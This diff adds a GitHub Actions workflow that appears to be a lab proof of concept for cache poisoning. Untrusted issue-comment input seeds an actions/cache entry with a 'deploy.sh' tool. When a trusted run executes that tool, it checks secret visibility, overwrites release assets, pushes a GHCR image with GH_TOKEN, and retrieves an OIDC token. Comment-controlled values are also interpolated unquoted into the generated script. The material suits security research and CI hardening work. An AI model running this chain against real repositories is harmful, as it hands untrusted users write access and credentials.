@@ -1,0 +1,259 @@
+name: Cache Repository Dispatch Seed
+
+on:
+  repository_dispatch:
+    types:
+      - cache-comment-seed
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  seed:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Resolve repository dispatch seed
+        id: seed
+        shell: bash
+        env:
+          CACHE_KEY: ${{ github.event.client_payload.cache_key }}
+          COMMENT_ACTOR: ${{ github.event.client_payload.comment_actor }}
+          COMMENT_ID: ${{ github.event.client_payload.comment_id }}
+          ISSUE_NUMBER: ${{ github.event.client_payload.issue_number }}
+          SOURCE_RUN_ID: ${{ github.event.client_payload.source_run_id }}
+        run: |
+          set -euo pipefail
+          mkdir -p observations
+          node <<'NODE'
+          const fs = require('node:fs');
+
+          function describe(value) {
+            return {
+              value,
+              length: value.length,
+              byteLength: Buffer.byteLength(value),
+              utf8Hex: Buffer.from(value, 'utf8').toString('hex'),
+              codePoints: [...value].map(char =>
+                `U+${char.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}`
+              )
+            };
+          }
+
+          const cacheKey = process.env.CACHE_KEY || '';
+          if (!cacheKey) {
+            throw new Error('repository_dispatch cache key was empty');
+          }
+
+          const metadata = {
+            event: 'repository_dispatch',
+            cacheKey: describe(cacheKey),
+            commentActor: process.env.COMMENT_ACTOR,
+            commentId: process.env.COMMENT_ID,
+            issueNumber: process.env.ISSUE_NUMBER,
+            sourceRunId: process.env.SOURCE_RUN_ID,
+            seedRunId: process.env.GITHUB_RUN_ID
+          };
+
+          fs.appendFileSync(process.env.GITHUB_OUTPUT, `cache_key<<EOF\n${cacheKey}\nEOF\n`);
+          fs.writeFileSync('observations/repository-dispatch-seed-metadata.json', `${JSON.stringify(metadata, null, 2)}\n`);
+          NODE
+
+      - name: Restore or reserve repository_dispatch cache
+        id: cache
+        uses: actions/cache@v6
+        with:
+          path: deploy-tools
+          key: ${{ steps.seed.outputs.cache_key }}
+
+      - name: Record cache outputs before seed
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p observations
+          {
+            echo "cache-hit=${{ steps.cache.outputs.cache-hit }}"
+            echo "cache-primary-key=${{ steps.cache.outputs.cache-primary-key }}"
+            echo "cache-matched-key=${{ steps.cache.outputs.cache-matched-key }}"
+          } | tee observations/cache-outputs.txt
+
+      - name: Prepare comment-controlled deploy tool
+        if: steps.cache.outputs.cache-hit != 'true'
+        shell: bash
+        env:
+          CACHE_KEY: ${{ steps.seed.outputs.cache_key }}
+          COMMENT_ACTOR: ${{ github.event.client_payload.comment_actor }}
+          COMMENT_ID: ${{ github.event.client_payload.comment_id }}
+          ISSUE_NUMBER: ${{ github.event.client_payload.issue_number }}
+          SOURCE_RUN_ID: ${{ github.event.client_payload.source_run_id }}
+        run: |
+          set -euo pipefail
+          mkdir -p deploy-tools observations
+          cat > deploy-tools/deploy.sh <<EOF
+          #!/usr/bin/env bash
+          set -euo pipefail
+          echo "tool-label=issue-comment-repository-dispatch-tool"
+          echo "tool-cache-key=${CACHE_KEY}"
+          echo "tool-source=low-trust-issue-comment-via-repository-dispatch"
+          echo "comment-actor=${COMMENT_ACTOR}"
+          echo "comment-id=${COMMENT_ID}"
+          echo "issue-number=${ISSUE_NUMBER}"
+          echo "source-issue-comment-run-id=${SOURCE_RUN_ID}"
+          if [[ -n "\${LAB_DEPLOY_SECRET:-}" ]]; then
+            echo "secret-visible-to-tool=true"
+          else
+            echo "secret-visible-to-tool=false"
+          fi
+          echo "deploy-target=production"
+          if [[ "\${LAB_RELEASE_WRITE_PROOF:-false}" == "true" ]]; then
+            : "\${GH_TOKEN:?GH_TOKEN is required for release write proof}"
+            : "\${LAB_RELEASE_TAG:?LAB_RELEASE_TAG is required for release write proof}"
+            : "\${LAB_RELEASE_ASSET_NAME:?LAB_RELEASE_ASSET_NAME is required for release write proof}"
+            mkdir -p release-proof
+            {
+              echo "release-write-proof=true"
+              echo "tool-label=issue-comment-repository-dispatch-tool"
+              echo "tool-cache-key=${CACHE_KEY}"
+              echo "tool-source=low-trust-issue-comment-via-repository-dispatch"
+              echo "comment-actor=${COMMENT_ACTOR}"
+              echo "comment-id=${COMMENT_ID}"
+              echo "source-issue-comment-run-id=${SOURCE_RUN_ID}"
+              echo "trusted-run-id=\${GITHUB_RUN_ID}"
+              echo "release-tag=\${LAB_RELEASE_TAG}"
+              echo "asset-name=\${LAB_RELEASE_ASSET_NAME}"
+              echo "github-repository=\${GITHUB_REPOSITORY}"
+            } > "release-proof/\${LAB_RELEASE_ASSET_NAME}"
+            if ! gh release view "\${LAB_RELEASE_TAG}" --repo "\${GITHUB_REPOSITORY}" >/dev/null 2>&1; then
+              gh release create "\${LAB_RELEASE_TAG}" \
+                --repo "\${GITHUB_REPOSITORY}" \
+                --target "\${GITHUB_SHA}" \
+                --title "Lab release write proof \${LAB_RELEASE_TAG}" \
+                --notes "Lab-only release for actions/cache write proof."
+            fi
+            gh release upload "\${LAB_RELEASE_TAG}" \
+              "release-proof/\${LAB_RELEASE_ASSET_NAME}#\${LAB_RELEASE_ASSET_NAME}" \
+              --repo "\${GITHUB_REPOSITORY}" \
+              --clobber
+            echo "release-asset-overwrite=true"
+            echo "release-tag=\${LAB_RELEASE_TAG}"
+            echo "release-asset=\${LAB_RELEASE_ASSET_NAME}"
+          fi
+          if [[ "\${LAB_GHCR_WRITE_PROOF:-false}" == "true" ]]; then
+            : "\${GH_TOKEN:?GH_TOKEN is required for GHCR write proof}"
+            : "\${LAB_GHCR_IMAGE:?LAB_GHCR_IMAGE is required for GHCR write proof}"
+            : "\${LAB_GHCR_TAG:?LAB_GHCR_TAG is required for GHCR write proof}"
+            mkdir -p package-proof
+            cat > package-proof/proof.txt <<PROOF
+          package-write-proof=true
+          tool-label=issue-comment-repository-dispatch-tool
+          tool-cache-key=${CACHE_KEY}
+          tool-source=low-trust-issue-comment-via-repository-dispatch
+          comment-actor=${COMMENT_ACTOR}
+          comment-id=${COMMENT_ID}
+          source-issue-comment-run-id=${SOURCE_RUN_ID}
+          trusted-run-id=\${GITHUB_RUN_ID}
+          image=\${LAB_GHCR_IMAGE}
+          tag=\${LAB_GHCR_TAG}
+          github-repository=\${GITHUB_REPOSITORY}
+          PROOF
+            cat > package-proof/Dockerfile <<DOCKER
+          FROM scratch
+          LABEL org.opencontainers.image.source="https://github.com/\${GITHUB_REPOSITORY}"
+          LABEL lab.package_write_proof="true"
+          LABEL lab.tool_label="issue-comment-repository-dispatch-tool"
+          LABEL lab.tool_source="low-trust-issue-comment-via-repository-dispatch"
+          LABEL lab.comment_actor="${COMMENT_ACTOR}"
+          LABEL lab.comment_id="${COMMENT_ID}"
+          LABEL lab.source_issue_comment_run_id="${SOURCE_RUN_ID}"
+          LABEL lab.trusted_run_id="\${GITHUB_RUN_ID}"
+          LABEL lab.cache_key="${CACHE_KEY}"
+          COPY proof.txt /proof.txt
+          DOCKER
+            echo "\${GH_TOKEN}" | docker login ghcr.io -u "\${GITHUB_ACTOR}" --password-stdin >/dev/null
+            docker build -t "\${LAB_GHCR_IMAGE}:\${LAB_GHCR_TAG}" package-proof
+            docker push "\${LAB_GHCR_IMAGE}:\${LAB_GHCR_TAG}"
+            docker image rm "\${LAB_GHCR_IMAGE}:\${LAB_GHCR_TAG}" >/dev/null 2>&1 || true
+            docker pull "\${LAB_GHCR_IMAGE}:\${LAB_GHCR_TAG}"
+            image_digest="\$(docker image inspect --format='{{index .RepoDigests 0}}' "\${LAB_GHCR_IMAGE}:\${LAB_GHCR_TAG}")"
+            image_labels="\$(docker image inspect --format='{{json .Config.Labels}}' "\${LAB_GHCR_IMAGE}:\${LAB_GHCR_TAG}")"
+            echo "package-write-proof=true"
+            echo "package-image=\${LAB_GHCR_IMAGE}"
+            echo "package-tag=\${LAB_GHCR_TAG}"
+            echo "package-image-digest=\${image_digest}"
+            echo "package-image-labels=\${image_labels}"
+          fi
+          if [[ "\${LAB_OIDC_PROOF:-false}" == "true" ]]; then
+            : "\${ACTIONS_ID_TOKEN_REQUEST_URL:?ACTIONS_ID_TOKEN_REQUEST_URL is required for OIDC proof}"
+            : "\${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?ACTIONS_ID_TOKEN_REQUEST_TOKEN is required for OIDC proof}"
+            audience="\${LAB_OIDC_AUDIENCE:-cache-oidc-proof}"
+            encoded_audience="\$(AUDIENCE="\${audience}" node -e 'process.stdout.write(encodeURIComponent(process.env.AUDIENCE))')"
+            oidc_response="\$(curl -fsSL -H "Authorization: bearer \${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "\${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=\${encoded_audience}")"
+            mkdir -p oidc-proof
+            OIDC_RESPONSE="\${oidc_response}" OIDC_AUDIENCE="\${audience}" node <<'OIDCNODE'
+          const crypto = require('node:crypto');
+          const fs = require('node:fs');
+
+          const response = JSON.parse(process.env.OIDC_RESPONSE || '{}');
+          const token = response.value;
+          if (!token) {
+            throw new Error('OIDC response did not include a token value');
+          }
+
+          function decodeBase64Url(part) {
+            const normalized = part.replace(/-/g, '+').replace(/_/g, '/');
+            const padded = normalized + '='.repeat((4 - normalized.length % 4) % 4);
+            return Buffer.from(padded, 'base64').toString('utf8');
+          }
+
+          const [headerPart, payloadPart] = token.split('.');
+          const header = JSON.parse(decodeBase64Url(headerPart));
+          const payload = JSON.parse(decodeBase64Url(payloadPart));
+          const safe = {
+            oidcTokenRetrieved: true,
+            tokenSha256: crypto.createHash('sha256').update(token).digest('hex'),
+            audienceRequested: process.env.OIDC_AUDIENCE,
+            headerAlg: header.alg,
+            headerTyp: header.typ,
+            aud: payload.aud,
+            sub: payload.sub,
+            repository: payload.repository,
+            repository_id: payload.repository_id,
+            repository_owner: payload.repository_owner,
+            repository_visibility: payload.repository_visibility,
+            ref: payload.ref,
+            sha: payload.sha,
+            workflow: payload.workflow,
+            workflow_ref: payload.workflow_ref,
+            job_workflow_ref: payload.job_workflow_ref,
+            run_id: payload.run_id,
+            run_number: payload.run_number,
+            actor: payload.actor,
+            event_name: payload.event_name,
+            issuer: payload.iss
+          };
+
+          fs.writeFileSync('oidc-proof/claims.json', JSON.stringify(safe, null, 2) + '\n');
+          for (const [key, value] of Object.entries(safe)) {
+            console.log(key + '=' + (Array.isArray(value) ? value.join(',') : value));
+          }
+          OIDCNODE
+          fi
+          EOF
+          chmod +x deploy-tools/deploy.sh
+          printf 'prepare-ran=true\ncache-key=%s\n' "$CACHE_KEY" | tee observations/prepared.txt
+
+      - name: Inspect repository_dispatch seed result
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          find deploy-tools observations -maxdepth 3 -type f -print -exec sed -n '1,80p' {} \; || true
+
+      - name: Upload repository_dispatch seed observations
+        if: always()
+        uses: actions/upload-artifact@v6
+        with:
+          name: cache-repository-dispatch-seed-${{ github.run_id }}-${{ github.run_attempt }}
+          path: observations/
+          if-no-files-found: warn
